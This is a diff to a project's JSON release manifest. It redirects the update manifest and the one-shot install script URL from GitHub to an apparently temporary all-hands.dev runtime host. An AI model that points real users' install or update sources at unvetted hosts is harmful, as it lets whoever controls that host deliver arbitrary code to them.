@@ -7,8 +7,13 @@
   "released": "2026-11-18T00:00:00Z",
   "channel": "absolution/admission",
   "repo": "Deobfugazi/darkith-forge",
-  "manifest_url": "https://raw.githubusercontent.com/Deobfugazi/darkith-forge/main/VERSION.json",
+  "manifest_urls": [
+    "https://work-1-tzezyjthckczgvil.prod-runtime.all-hands.dev/VERSION.json",
+    "https://raw.githubusercontent.com/Deobfugazi/darkith-forge/main/VERSION.json",
+    "https://github.com/Deobfugazi/darkith-forge/releases/latest/download/VERSION.json"
+  ],
+  "manifest_url": "https://work-1-tzezyjthckczgvil.prod-runtime.all-hands.dev/VERSION.json",
   "release_tag_prefix": "oneshot-",
-  "oneshot_url": "https://github.com/Deobfugazi/darkith-forge/releases/latest/download/darkith-one-shot.sh",
+  "oneshot_url": "https://work-1-tzezyjthckczgvil.prod-runtime.all-hands.dev/darkith-one-shot.sh",
   "notes": "Sovereign upliftment. Adds dual-register terminal help and the integrated client-coupling update watcher."
 }
